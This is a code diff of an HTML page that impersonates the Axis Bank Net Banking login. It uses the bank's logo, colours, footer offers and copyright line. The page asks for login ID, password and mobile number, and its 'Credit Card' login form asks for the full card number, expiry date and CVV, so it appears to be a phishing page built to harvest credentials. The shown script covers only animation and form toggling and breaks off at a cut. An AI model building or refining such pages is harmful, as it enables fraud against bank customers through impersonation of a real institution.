@@ -3,578 +3,1138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Axis Bank NetBanking Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Axis Bank Net Banking</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         
         body {
-            background-color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: #f0f2f5;
             min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .login-container {
-            width: 100%;
-            max-width: 420px;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-        
-        /* Header Styles - Made thinner */
-        .login-header {
-            background-color: #1a3c8b;
-            color: white;
-            padding: 8px 20px;
-            text-align: center;
-            position: relative;
-        }
-        
-        .bank-logo {
-            font-weight: 700;
-            font-size: 24px;
-            letter-spacing: 0.5px;
             display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            flex-direction: column;
         }
         
-        .bank-logo i {
-            font-size: 20px;
-        }
-        
-        .tagline {
-            font-size: 12px;
-            opacity: 0.9;
-            margin-top: 4px;
-        }
-        
-        .login-form {
-            padding: 30px;
-        }
-        
-        .login-title {
-            color: #1a3c8b;
-            margin-bottom: 25px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 600;
-        }
-        
-        .input-group {
-            margin-bottom: 20px;
-        }
-        
-        .input-label {
-            display: flex;
-            align-items: center;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-        }
-        
-        .input-label i {
-            margin-right: 8px;
-            color: #1a3c8b;
-        }
-        
-        .radio-options {
-            display: flex;
-            gap: 25px;
-            margin-top: 5px;
-        }
-        
-        .radio-option {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        
-        .radio-option input {
-            margin: 0;
-            cursor: pointer;
-        }
-        
-        .input-field {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 15px;
-            transition: border-color 0.3s;
-        }
-        
-        .input-field:focus {
-            outline: none;
-            border-color: #1a3c8b;
-            box-shadow: 0 0 0 2px rgba(26, 60, 139, 0.1);
-        }
-        
-        .forgot-links {
-            display: flex;
-            justify-content: space-between;
-            margin: 15px 0 25px;
-        }
-        
-        .forgot-link {
-            color: #ff0000;
-            font-size: 14px;
-            text-decoration: none;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-        
-        .forgot-link:hover {
-            color: #cc0000;
-            text-decoration: underline;
-        }
-        
-        .dropdown-group {
-            margin-bottom: 25px;
-        }
-        
-        .dropdown-label {
-            display: flex;
-            align-items: center;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-        }
-        
-        .dropdown-label i {
-            margin-right: 8px;
-            color: #1a3c8b;
-        }
-        
-        .custom-dropdown {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 15px;
-            background-color: white;
-            cursor: pointer;
-            appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: right 15px center;
-            background-size: 16px;
-            padding-right: 40px;
-        }
-        
-        .custom-dropdown:focus {
-            outline: none;
-            border-color: #1a3c8b;
-            box-shadow: 0 0 0 2px rgba(26, 60, 139, 0.1);
-        }
-        
-        .login-button {
-            width: 100%;
-            padding: 15px;
-            background-color: #1a3c8b;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            margin-bottom: 20px;
-        }
-        
-        .login-button:hover {
-            background-color: #0f2a6b;
-        }
-        
-        .register-link {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 15px;
-        }
-        
-        .register-link a {
-            color: #1a3c8b;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        
-        .register-link a:hover {
-            text-decoration: underline;
-        }
-        
-        /* Loading Animation - Dots moving left to right */
-        .loading-container {
-            margin: 25px 0;
-            display: none;
-        }
-        
-        .loading-text {
-            text-align: center;
-            color: #1a3c8b;
-            font-weight: 600;
-            margin-bottom: 10px;
-            font-size: 15px;
-        }
-        
-        .loading-track {
-            width: 100%;
-            height: 20px;
-            position: relative;
-            overflow: hidden;
-            margin-bottom: 25px;
-        }
-        
-        .moving-dot {
-            position: absolute;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background-color: #1a3c8b;
-            top: 4px;
-            left: 0;
-            animation: moveDot 2s linear infinite;
-        }
-        
-        @keyframes moveDot {
-            0% {
-                left: 0;
-                transform: scale(0.8);
-            }
-            50% {
-                left: calc(100% - 12px);
-                transform: scale(1.2);
-            }
-            100% {
-                left: 0;
-                transform: scale(0.8);
-            }
-        }
-        
-        /* Modal Styles */
-        .modal {
-            display: none;
+        /* Page Load Animation - White background for dot reflection */
+        .page-loader {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 100;
+            background: white; /* Solid white background for better dot reflection */
+            display: flex;
             justify-content: center;
             align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
         }
         
-        .modal-content {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+        .loader-container {
+            position: relative;
+            width: 100%;
+            height: 100px;
+        }
+        
+        .loader-dot {
+            width: 15px;
+            height: 15px;
+            background: #87103F; /* Maroon Red */
+            border-radius: 50%;
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            animation: dotAnimation 2.4s linear infinite;
+            box-shadow: 0 0 20px rgba(135, 16, 63, 0.8), 0 0 40px rgba(135, 16, 63, 0.6);
+        }
+        
+        @keyframes dotAnimation {
+            0% {
+                left: 0;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            6.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
+            }
+            12.5% {
+                left: 12.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            18.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
+            }
+            25% {
+                left: 25%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            31.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
+            }
+            37.5% {
+                left: 37.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            43.75% {
+                width: 40px;
+                height: 40px;
+                opacity: 1;
+                box-shadow: 0 0 40px rgba(135, 16, 63, 1);
+            }
+            50% {
+                left: 50%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            56.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
+            }
+            62.5% {
+                left: 62.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            68.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
+            }
+            75% {
+                left: 75%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            81.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
+            }
+            87.5% {
+                left: 87.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            93.75% {
+                width: 20px;
+                height: 20px;
+                opacity: 1;
+                box-shadow: 0 0 20px rgba(135, 16, 63, 1);
+            }
+            100% {
+                left: 100%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+        }
+        
+        .loader-text {
+            color: #87103F;
+            font-size: 24px;
+            font-weight: bold;
+            position: absolute;
+            top: 60%;
+            text-align: center;
+            width: 100%;
+            opacity: 0;
+            animation: fadeInText 1s ease 0.5s forwards;
+        }
+        
+        @keyframes fadeInText {
+            to { opacity: 1; }
+        }
+        
+        /* Main Container */
+        .main-container {
+            opacity: 0;
+            animation: fadeIn 0.5s ease 3s forwards;
+            flex: 1;
+        }
+        
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        
+        /* Updated Header with left logo and custom heading */
+        .bank-header {
+            background: white;
+            padding: 15px 40px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             position: relative;
         }
         
-        .modal-title {
-            color: #1a3c8b;
-            margin-bottom: 15px;
-            font-size: 20px;
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
         
-        .modal-text {
-            margin-bottom: 20px;
-            color: #555;
-            line-height: 1.5;
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 20px;
         }
         
-        .close-modal {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            background: none;
-            border: none;
+        /* Updated Logo */
+        .bank-logo {
+            height: 45px;
+            width: auto;
+            object-fit: contain;
+        }
+        
+        .bank-title {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .bank-name {
+            font-size: 28px;
+            font-weight: bold;
+            color: #87103F;
+            letter-spacing: 1px;
+        }
+        
+        /* Your custom heading style */
+        .header-info {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        
+        .header-text-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+        
+        .open-text {
+            color: #971647;
+            font-weight: bold;
+            font-style: italic;
             font-size: 24px;
-            color: #777;
-            cursor: pointer;
-            line-height: 1;
         }
         
-        .modal-button {
-            padding: 12px 25px;
-            background-color: #1a3c8b;
+        .banking-text {
+            color: #971647;
+            font-style: italic;
+            font-size: 18px;
+            letter-spacing: 1px;
+        }
+        
+        .separator {
+            color: #ccc;
+            margin: 0 10px;
+        }
+        
+        .login-using {
+            font-size: 16px;
+            color: #666;
+        }
+        
+        /* Main Content */
+        .main-content {
+            display: flex;
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+            gap: 40px;
+        }
+        
+        /* Login Box */
+        .login-container {
+            flex: 1;
+            max-width: 500px;
+        }
+        
+        .login-box {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .login-header {
+            background: #87103F;
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .login-subtitle {
+            opacity: 0.9;
+            font-size: 16px;
+        }
+        
+        /* Toggle Switch */
+        .toggle-container {
+            display: flex;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50px;
+            padding: 5px;
+            margin: 25px auto 0;
+            width: 80%;
+            position: relative;
+        }
+        
+        .toggle-option {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 1;
+            position: relative;
+            color: white;
+        }
+        
+        .toggle-slider {
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            width: calc(50% - 5px);
+            height: calc(100% - 10px);
+            background: white;
+            border-radius: 50px;
+            transition: transform 0.3s ease;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .active-toggle {
+            color: #87103F;
+        }
+        
+        /* Forms */
+        .form-container {
+            padding: 30px;
+        }
+        
+        .login-form {
+            display: block;
+        }
+        
+        .credit-form {
+            display: none;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9f9f9;
+        }
+        
+        .form-input:focus {
+            border-color: #87103F;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #87103F;
+        }
+        
+        /* Login Button */
+        .login-btn-container {
+            position: relative;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        
+        .login-button {
+            width: 100%;
+            background: #87103F;
             color: white;
             border: none;
-            border-radius: 5px;
-            font-size: 15px;
-            font-weight: 600;
+            padding: 18px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
         }
         
-        .modal-button:hover {
-            background-color: #0f2a6b;
+        .login-button:hover {
+            background: #6a0c32;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
         }
         
-        /* Responsive Design */
-        @media (max-width: 480px) {
-            .login-form {
+        .login-button.loading {
+            background: #6a0c32;
+            cursor: not-allowed;
+        }
+        
+        .login-button.loading:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: button-loading 0.6s linear infinite;
+        }
+        
+        @keyframes button-loading {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Links */
+        .form-links {
+            text-align: center;
+            margin-top: 25px;
+        }
+        
+        .form-links a {
+            color: #87103F;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 0 15px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Info Sections */
+        .info-section {
+            flex: 1.5;
+        }
+        
+        .info-card {
+            background: #87103F;
+            color: white;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.2);
+            border-left: 5px solid #ffcc00;
+        }
+        
+        .info-title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .info-icon {
+            font-size: 24px;
+        }
+        
+        .info-content {
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-size: 16px;
+            opacity: 0.95;
+        }
+        
+        .info-button {
+            background: white;
+            color: #87103F;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .info-button:hover {
+            background: #f0f0f0;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
+        }
+        
+        /* Footer */
+        .main-footer {
+            background: #87103F;
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+            margin-top: 50px;
+            box-shadow: 0 -4px 12px rgba(135, 16, 63, 0.3);
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .footer-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 25px;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+        
+        .footer-links a:hover {
+            background: rgba(255, 255, 255, 0.1);
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        /* Responsive */
+        @media (max-width: 992px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .login-container {
+                max-width: 100%;
+            }
+            
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+            
+            .logo-section {
+                justify-content: center;
+            }
+            
+            .header-info {
+                align-items: center;
+                text-align: center;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .bank-header {
+                padding: 12px 20px;
+            }
+            
+            .bank-logo {
+                height: 40px;
+            }
+            
+            .bank-name {
+                font-size: 24px;
+            }
+            
+            .open-text {
+                font-size: 20px;
+            }
+            
+            .banking-text {
+                font-size: 16px;
+            }
+            
+            .login-using {
+                font-size: 14px;
+            }
+            
+            .main-content {
+                padding: 0 15px;
+                margin: 20px auto;
+            }
+            
+            .info-card {
                 padding: 20px;
             }
             
-            .forgot-links {
+            .footer-links {
                 flex-direction: column;
-                gap: 10px;
+                gap: 15px;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .header-text-container {
+                flex-direction: column;
+                gap: 5px;
             }
             
-            .radio-options {
-                flex-direction: column;
-                gap: 10px;
+            .separator {
+                display: none;
+            }
+            
+            .bank-logo {
+                height: 35px;
+            }
+            
+            .bank-name {
+                font-size: 20px;
+            }
+            
+            .open-text {
+                font-size: 18px;
+            }
+            
+            .banking-text {
+                font-size: 14px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <!-- Header Section -->
-        <div class="login-header">
-            <div class="bank-logo">
-                <i class="fas fa-university"></i>
-                AXIS BANK
+    <!-- Page Load Animation -->
+    <div class="page-loader" id="pageLoader">
+        <div class="loader-container">
+            <div class="loader-dot"></div>
+            <div class="loader-text">Loading Axis Bank Net Banking...</div>
+        </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Updated Header -->
+        <header class="bank-header">
+            <div class="header-content">
+                <div class="logo-section">
+                    <!-- Axis Bank Logo from URL -->
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Axis_Bank_logo.svg/2560px-Axis_Bank_logo.svg.png" 
+                         alt="Axis Bank Logo" 
+                         class="bank-logo">
+                    <div class="bank-title">
+                        <div class="bank-name">AXIS BANK</div>
+                    </div>
+                </div>
+                
+                <div class="header-info">
+                    <!-- Your custom heading -->
+                    <div class="header-text-container">
+                        <span class="open-text">open</span>
+                        <span class="separator">|</span>
+                        <span class="banking-text">INTERNET BANKING</span>
+                    </div>
+                    <div class="login-using">Login using</div>
+                </div>
             </div>
-            <div class="tagline">NetBanking - Secure Login</div>
+        </header>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Login Section -->
+            <div class="login-container">
+                <div class="login-box">
+                    <div class="login-header">
+                        <div class="login-title">Secure Login</div>
+                        <div class="login-subtitle">Access your account safely</div>
+                        
+                        <!-- Toggle Switch -->
+                        <div class="toggle-container">
+                            <div class="toggle-option active-toggle" id="toggleLogin">Login ID</div>
+                            <div class="toggle-option" id="toggleCredit">Credit Card</div>
+                            <div class="toggle-slider" id="toggleSlider"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-container">
+                        <!-- Login ID Form -->
+                        <form class="login-form" id="loginForm">
+                            <div class="form-group">
+                                <label class="form-label" for="loginId">Login / Customer ID</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="loginId" name="loginId" placeholder="Enter your Login ID" required>
+                                    <div class="input-icon">👤</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="password">Password</label>
+                                <div class="input-with-icon">
+                                    <input type="password" class="form-input" id="password" name="password" placeholder="Enter your password" required>
+                                    <div class="input-icon">🔒</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="mobile">Mobile Number</label>
+                                <div class="input-with-icon">
+                                    <input type="tel" class="form-input" id="mobile" name="mobile" placeholder="Registered mobile number" required>
+                                    <div class="input-icon">📱</div>
+                                </div>
+                            </div>
+                            
+                            <div class="login-btn-container">
+                                <button type="submit" class="login-button" id="loginButton">
+                                    Login to Net Banking
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <!-- Credit Card Form -->
+                        <form class="credit-form" id="creditForm">
+                            <div class="form-group">
+                                <label class="form-label" for="cardNumber">16 Digit Card Number</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                                    <div class="input-icon">💳</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="expiry">Expiry Date</label>
+                                <input type="text" class="form-input" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="cvv">CVV</label>
+                                <input type="password" class="form-input" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="cardMobile">Mobile Number</label>
+                                <div class="input-with-icon">
+                                    <input type="tel" class="form-input" id="cardMobile" name="cardMobile" placeholder="Registered mobile number" required>
+                                    <div class="input-icon">📱</div>
+                                </div>
+                            </div>
+                            
+                            <div class="login-btn-container">
+                                <button type="submit" class="login-button" id="creditButton">
+                                    Login with Credit Card
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <div class="form-links">
+                            <a href="#" id="forgotLink">Forgot Login ID / Password?</a>
+                            <a href="#">New User? Register Here</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Info Section -->
+            <div class="info-section">
+                <div class="info-card">
+                    <div class="info-title">
+                        <span class="info-icon">🔒</span> Secure & Reliable
+                    </div>
+                    <div class="info-content">
+                        Bank with confidence. Know your digital safety measures.
+                    </div>
+                    <button class="info-button">KNOW MORE</button>
+                </div>
+                
+                <div class="info-card">
+                    <div class="info-title">
+                        <span class="info-icon">📞</span> Get in Touch
+                    </div>
+                    <div class="info-content">
+                        We have got your back when you are stuck.
+                    </div>
+                    <button class="info-button">KNOW MORE</button>
+                </div>
+                
+                <div class="info-card">
+                    <div class="info-title">
+                        <span class="info-icon">📱</span> Get Mobile App
+                    </div>
+                    <div class="info-content">
+                        Download our Axis Bank mobile app on your smartphone.
+                    </div>
+                    <button class="info-button">DOWNLOAD</button>
+                </div>
+            </div>
         </div>
         
-        <!-- Login Form -->
-        <div class="login-form">
-            <h2 class="login-title">Login using</h2>
-            
-            <!-- Login ID / Customer ID Option -->
-            <div class="input-group">
-                <div class="input-label">
-                    <i class="fas fa-user"></i>
-                    <span>Login ID / Customer ID</span>
+        <!-- Footer -->
+        <footer class="main-footer">
+            <div class="footer-content">
+                <div class="footer-text">Exclusive offers and products</div>
+                <div class="footer-links">
+                    <a href="#">Contactless enabled Credit Cards</a>
+                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
+                    <a href="#">Experience seamless credit approval</a>
+                    <a href="#">Instant personal loans</a>
+                    <a href="#">Zero balance savings account</a>
                 </div>
-                <div class="radio-options">
-                    <label class="radio-option">
-                        <input type="radio" name="id-type" value="login-id" checked>
-                        Login ID
-                    </label>
-                    <label class="radio-option">
-                        <input type="radio" name="id-type" value="customer-id">
-                        Customer ID
-                    </label>
+                <div class="copyright">
+                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
                 </div>
             </div>
-            
-            <!-- ID Input Field -->
-            <div class="input-group">
-                <div class="input-label">
-                    <i class="fas fa-id-card"></i>
-                    <span class="id-label">Login ID</span>
-                </div>
-                <input type="text" class="input-field" id="loginId" placeholder="Enter ID">
-            </div>
-            
-            <!-- Password Input Field -->
-            <div class="input-group">
-                <div class="input-label">
-                    <i class="fas fa-lock"></i>
-                    <span>Password</span>
-                </div>
-                <input type="password" class="input-field" id="password" placeholder="Enter Password">
-            </div>
-            
-            <!-- Forgot Links - Red color -->
-            <div class="forgot-links">
-                <a class="forgot-link" id="forgotCustomerId">Forgot customer ID</a>
-                <a class="forgot-link" id="enableLoginId">Enable login ID</a>
-                <a class="forgot-link" id="forgotPassword">Forgot password</a>
-            </div>
-            
-            <!-- "Login directly to" text and dropdown below it -->
-            <div class="input-label">
-                <i class="fas fa-sign-in-alt"></i>
-                <span>Login directly to</span>
-            </div>
-            <div class="dropdown-group">
-                <select class="custom-dropdown" id="loginDestination">
-                    <option value="dashboard">Dashboard</option>
-                    <option value="accounts">Accounts</option>
-                    <option value="transfers">Funds Transfer</option>
-                    <option value="cards">Cards</option>
-                    <option value="investments">Investments</option>
-                </select>
-            </div>
-            
-            <!-- Loading Animation - Dot moving left to right -->
-            <div class="loading-container" id="loadingAnimation">
-                <div class="loading-track">
-                    <div class="moving-dot"></div>
-                </div>
-            </div>
-            
-            <!-- Login Button -->
-            <button class="login-button" id="loginButton">Login</button>
-            
-            <!-- Register Link -->
-            <div class="register-link">
-                First time user? <a href="#">REGISTER HERE</a>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Forgot Customer ID Modal -->
-    <div class="modal" id="forgotCustomerIdModal">
-        <div class="modal-content">
-            <button class="close-modal">&times;</button>
-            <h3 class="modal-title">Forgot Customer ID</h3>
-            <p class="modal-text">To retrieve your Customer ID, please visit your nearest Axis Bank branch with your account details and valid ID proof, or call our customer care at 1860-419-5555.</p>
-            <button class="modal-button" id="closeForgotCustomerId">Close</button>
-        </div>
-    </div>
-    
-    <!-- Enable Login ID Modal -->
-    <div class="modal" id="enableLoginIdModal">
-        <div class="modal-content">
-            <button class="close-modal">&times;</button>
-            <h3 class="modal-title">Enable Login ID</h3>
-            <p class="modal-text">To enable Login ID for your account, please log in with your Customer ID first, then go to Profile Settings to set up a Login ID. Alternatively, visit any Axis Bank branch for assistance.</p>
-            <button class="modal-button" id="closeEnableLoginId">Close</button>
-        </div>
-    </div>
-    
-    <!-- Forgot Password Modal -->
-    <div class="modal" id="forgotPasswordModal">
-        <div class="modal-content">
-            <button class="close-modal">&times;</button>
-            <h3 class="modal-title">Forgot Password</h3>
-            <p class="modal-text">To reset your password, click the button below. You will be redirected to our secure password reset page where you can verify your identity and set a new password.</p>
-            <button class="modal-button" id="resetPassword">Reset Password</button>
-        </div>
+        </footer>
     </div>
 
     <script>
-        // DOM Elements
+        // Page load animation
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('pageLoader').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('pageLoader').style.display = 'none';
+                }, 500);
+            }, 3000);
+        });
+        
+        // DOM elements
+        const toggleLogin = document.getElementById('toggleLogin');
+        const toggleCredit = document.getElementById('toggleCredit');
+        const toggleSlider = document.getElementById('toggleSlider');
+        const loginForm = document.getElementById('loginForm');
+        const creditForm = document.getElementById('creditForm');
+        const forgotLink = document.getElementById('forgotLink');
+        const cardNumberInput = document.getElementById('cardNumber');
+        const expiryInput = document.getElementById('expiry');
+        const cvvInput = document.getElementById('cvv');
         const loginButton = document.getElementById('loginButton');
-        const forgotCustomerId = document.getElementById('forgotCustomerId');
-        const enableLoginId = document.getElementById('enableLoginId');
-        const forgotPassword = document.getElementById('forgotPassword');
-        const loginDestination = document.getElementById('loginDestination');
-        const loadingAnimation = document.getElementById('loadingAnimation');
-        const idTypeRadios = document.querySelectorAll('input[name="id-type"]');
-        const idLabel = document.querySelector('.id-label');
+        const creditButton = document.getElementById('creditButton');
         
-        // Modal Elements
-        const forgotCustomerIdModal = document.getElementById('forgotCustomerIdModal');
-        const enableLoginIdModal = document.getElementById('enableLoginIdModal');
-        const forgotPasswordModal = document.getElementById('forgotPasswordModal');
-        const closeModals = document.querySelectorAll('.close-modal');
-        const closeForgotCustomerId = document.getElementById('closeForgotCustomerId');
-        const closeEnableLoginId = document.getElementById('closeEnableLoginId');
-        const resetPassword = document.getElementById('resetPassword');
+        // Toggle Switch Functionality
+        toggleLogin.addEventListener('click', function() {
+            // Update toggle UI
+            toggleLogin.classList.add('active-toggle');
+            toggleCredit.classList.remove('active-toggle');
+            toggleSlider.style.transform = 'translateX(0)';
+            
+            // Show login form, hide credit form
+            loginForm.style.display = 'block';
+            creditForm.style.display = 'none';
+            
+            // Update forgot link
+            forgotLink.textContent = 'Forgot Login ID / Password?';
+        });
         
-        // Login ID/Customer ID radio button change
-        idTypeRadios.forEach(radio => {
